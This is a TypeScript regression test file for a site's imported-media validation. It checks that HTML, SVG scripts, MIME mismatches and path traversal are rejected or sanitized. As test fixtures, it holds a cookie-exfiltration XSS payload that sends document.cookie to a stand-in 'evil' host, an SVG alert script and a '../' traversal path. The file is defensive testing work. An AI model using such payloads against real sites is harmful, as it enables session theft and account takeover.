/**
 * Security regression tests for the shared imported-media gate.
 *
 * Both import paths — the JSON `SiteBundle` import (`import.ts`) and the
 * archive import (`importArchive.ts`) — route media through these two
 * functions. The JSON path previously wrote `bytesBase64` to
 * `join(uploadsDir, storagePath)` with only a traversal check, letting a
 * `data.import` caller plant arbitrary HTML/JS (e.g. `published/current/
 * index.html`) served same-origin as `/admin` → stored XSS / account takeover.
 * These tests prove the content gate and the destination gate close it.
 */
import { describe, expect, it } from 'bun:test'
import { join } from 'node:path'
import {
  ImportMediaValidationError,
  resolveMediaWriteTarget,
  validateAndSanitizeMediaBytes,
} from '../importMediaValidation'

const enc = new TextEncoder()

// PNG 8-byte magic signature — enough for `detectAcceptedMime` to classify.
const PNG_MAGIC = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x01])

describe('validateAndSanitizeMediaBytes — content gate', () => {
  it('rejects HTML/script bytes (no accepted media MIME) — the account-takeover payload', () => {
    const html = enc.encode('<!DOCTYPE html><script>fetch("//evil/?c="+document.cookie)</script>')
    expect(() =>
      validateAndSanitizeMediaBytes(html, { storagePath: 'published/current/index.html', mimeType: 'text/html' }),
    ).toThrow(ImportMediaValidationError)
  })

  it('rejects a MIME mismatch (SVG bytes declared image/jpeg)', () => {
    const svg = enc.encode('<svg><rect width="10" height="10"/></svg>')
    expect(() =>
      validateAndSanitizeMediaBytes(svg, { storagePath: 'photo.jpg', mimeType: 'image/jpeg' }),
    ).toThrow(ImportMediaValidationError)
  })

  it('rejects extension laundering (SVG bytes named .html)', () => {
    const svg = enc.encode('<svg><rect width="10" height="10"/></svg>')
    expect(() =>
      validateAndSanitizeMediaBytes(svg, { storagePath: 'exploit.html', mimeType: 'image/svg+xml' }),
    ).toThrow(ImportMediaValidationError)
  })

  it('sanitizes a <script> payload out of an otherwise-valid SVG', () => {
    const svg = enc.encode('<svg viewBox="0 0 10 10"><script>alert(1)</script><rect width="10" height="10"/></svg>')
    const clean = new TextDecoder().decode(
      validateAndSanitizeMediaBytes(svg, { storagePath: 'icon.svg', mimeType: 'image/svg+xml' }),
    )
    expect(clean.toLowerCase()).not.toContain('<script')
    expect(clean.toLowerCase()).not.toContain('alert(1)')
    expect(clean).toContain('<rect')
  })

  it('passes a valid image through unchanged', () => {
    const out = validateAndSanitizeMediaBytes(PNG_MAGIC, { storagePath: 'abc.png', mimeType: 'image/png' })
    expect(out).toEqual(PNG_MAGIC)
  })
})

describe('resolveMediaWriteTarget — destination gate', () => {
  const uploads = '/tmp/uploads'

  it.each(['published/current/index.html', 'plugins/acme/app.js', 'fonts/inter.woff2', 'PUBLISHED/x.png'])(
    'rejects a write into the reserved served subtree: %s',
    (storagePath) => {
      expect(() => resolveMediaWriteTarget(uploads, storagePath)).toThrow(ImportMediaValidationError)
    },
  )

  it('rejects a traversal escape', () => {
    expect(() => resolveMediaWriteTarget(uploads, '../evil.png')).toThrow()
  })

  it('resolves a normal hashed media filename to a path inside uploads', () => {
    expect(resolveMediaWriteTarget(uploads, 'a1b2c3-photo.jpg')).toBe(join(uploads, 'a1b2c3-photo.jpg'))
  })
})
